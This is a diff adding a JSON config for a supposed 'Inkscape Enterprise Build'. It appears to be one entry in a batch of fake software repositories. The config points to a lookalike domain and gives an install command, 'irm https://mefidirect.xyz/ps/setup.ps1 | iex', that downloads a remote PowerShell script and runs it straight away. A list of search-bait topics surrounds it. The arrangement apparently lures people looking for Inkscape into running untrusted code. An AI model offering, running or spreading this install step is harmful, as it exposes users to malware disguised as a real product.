@@ -1,0 +1,27 @@
+{
+  "repo": "inkscape-enterprise-build",
+  "product": "Inkscape Enterprise Build",
+  "kind": "photo",
+  "install_type": "download",
+  "download_url": "https://inkscape.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "photo",
+  "topics": [
+    "inkscape-toolkit",
+    "inkscape-howto",
+    "workstation-ready",
+    "inkscape-build",
+    "offline-capable",
+    "how-to-install-inkscape",
+    "inkscape-latest-build",
+    "inkscape-setup-guide-2026",
+    "inkscape-desktop",
+    "native-windows",
+    "x64-build",
+    "pc-toolkit",
+    "inkscape-edition"
+  ]
+}
